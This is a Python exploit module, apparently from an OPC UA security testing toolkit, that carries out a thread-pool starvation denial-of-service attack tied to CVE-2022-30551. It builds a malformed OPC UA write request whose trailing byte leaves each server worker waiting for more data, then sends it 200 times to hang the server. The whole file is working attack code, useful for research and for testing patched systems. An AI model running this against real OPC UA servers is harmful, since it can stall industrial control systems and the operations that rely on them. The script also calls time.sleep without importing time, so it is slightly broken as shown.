# Threads Deadlock Attack
#   Thread pool deadlock due to concurrent worker starvation.
#       Example: Prosys OPCUA stack had by default 65 thread workers so it was enough to send 65 concurrent request that will wait for
#       more data to be stuck forever
#
# CVEs:
#   - CVE-2022-30551: https://files.opcfoundation.org/SecurityBulletins/OPC%20Foundation%20Security%20Bulletin%20CVE-2022-30551.pdf, https://www.prosysopc.com/blog/pwn2own-resource-exhaustion-exploit/
#

import datetime

from protocol import *
from config import *

def attack(server_details, num_requests=200):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    # Prepare message
    message_header = opcua.build_opcua_message_header()

    message_body = b""
    message_body += b"\x01\x00" # Type ID - Expanded Node ID four byte encoded number 0x01 with namespace index 0
    message_body += b"\xa1\x02" # Write request (673)
    message_body += OBJECT.build(opcua.auth_id) # Auth token
    message_body += b"\xff" # Extra byte to keep worker in a busy waiting (wait for more..)
    message_write_starvation = bytearray(message_header + message_body)

    # Send num_requests times
    print("[-] Sending MSG Request - Worker Wait Data Starvation x {} times".format(num_requests))
    opcua.send_recv(message_write_starvation, num_requests, should_recv=False)

    # Sleep to make sure all workers are captures
    print("[-] Sleeping 3 seconds to make sure all chunks are received")
    time.sleep(3)

    # Close connection
    print("[-] Closing connection")
    opcua.close()